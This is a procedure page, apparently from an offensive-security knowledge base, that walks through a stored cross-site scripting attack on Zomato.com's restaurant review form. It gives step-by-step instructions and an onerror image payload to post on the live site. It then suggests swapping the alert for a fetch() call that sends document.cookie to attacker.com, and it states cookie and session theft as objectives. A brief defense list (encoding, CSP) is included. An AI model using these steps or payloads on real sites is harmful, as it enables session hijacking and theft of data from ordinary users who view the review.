---
tags:
  - xss
  - stored-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: e43bf285-3765-497f-9db0-7e548bd35bc8
created_at: '2025-12-14T03:16:07.890Z'
updated_at: '2025-12-14T03:16:07.890Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS-via-Restaurant-Review-Injection-on-Zomato-com

## Summary

This procedure exploits a stored cross-site scripting vulnerability in Zomato.com's restaurant review feature, where unsanitized user input in reviews is rendered without proper encoding, allowing attackers to inject and execute arbitrary JavaScript when the review is viewed by other users.

## Description

The vulnerability arises from a lack of input sanitization or output encoding during review submission and display on zomato.com. An attacker can submit a malicious review containing JavaScript, which executes in the context of the victim's browser when they view the review. This can lead to session hijacking, cookie theft, or phishing attacks. Discovered through manual testing of the review input field, the exploit requires no authentication and impacts any user viewing the tainted review.

## Requirements

1. Web browser with JavaScript enabled
2. Access to zomato.com (public site, no login required for testing)
3. Ability to search for restaurants and submit reviews (may require a free account)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., using HTML entity encoding) for all user-generated content.
- Use Content Security Policy (CSP) to restrict inline script execution.
- Monitor for anomalous JavaScript alerts or network requests from review pages.

## Objectives

1. Inject and store malicious JavaScript in a restaurant review.
2. Execute the payload when the review is viewed by targets.
3. Steal sensitive data like cookies or session tokens.

## Instructions

### Step 1: Navigate and Prepare Review

**Context**: Access the review submission page to identify the vulnerable input field.

Open a web browser and go to zomato.com. Search for any restaurant, then click 'Write review' to open the input form.

### Step 2: Inject Payload

**Context**: Enter the malicious payload into the review text area, which is not sanitized.

In the review field, input the following payload:

```html
<img src=x onerror=alert(document.domain)>
```

This uses an invalid image source to trigger the onerror handler, executing the alert.

### Step 3: Publish and Verify

**Context**: Submit the review to store the payload and test execution.

Click 'Publish review'. Once published, view the review page. The payload should execute, showing an alert with the domain.

For real attacks, replace alert with code to exfiltrate data, e.g., `fetch('http://attacker.com?cookie='+document.cookie)`.

**Expected Output**: JavaScript alert popup confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
